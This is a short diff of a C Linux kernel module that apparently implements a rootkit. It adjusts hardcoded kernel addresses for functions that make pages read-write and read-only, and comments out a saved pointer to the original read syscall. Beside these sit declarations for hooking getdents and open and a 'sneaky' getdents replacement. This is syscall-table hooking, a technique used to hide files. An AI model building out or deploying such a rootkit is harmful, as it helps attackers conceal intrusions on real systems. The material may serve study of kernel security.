@@ -33,7 +33,7 @@ struct linux_dirent {
 //      /boot/System.map-`$(uname -r)`
 //      e.g. /boot/System.map-4.4.0-116-generic
 void (*pages_rw)(struct page * page, int numpages) = (void *)0xffffffff81073190;
-void (*pages_ro)(struct page * page, int numpages) = (void *)0xffffffff81073100;
+void (*pages_ro)(struct page * page, int numpages) = (void *)0xffffffff81073110;
 
 //This is a pointer to the system call table in memory
 //Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
@@ -48,7 +48,7 @@ asmlinkage int (*original_sys_getdents)(unsigned int fd,
                                         struct linux_dirent * dirp,
                                         unsigned int count);
 asmlinkage int (*original_sys_open)(const char * pathname, int flags);
-asmlinkage ssize_t (*original_sys_read)(int fd, void * buf, size_t count);
+//asmlinkage ssize_t (*original_sys_read)(int fd, void * buf, size_t count);
 
 //Define our new sneaky version of the 'getdents' syscall
 asmlinkage int sneaky_sys_getdents(unsigned int fd,
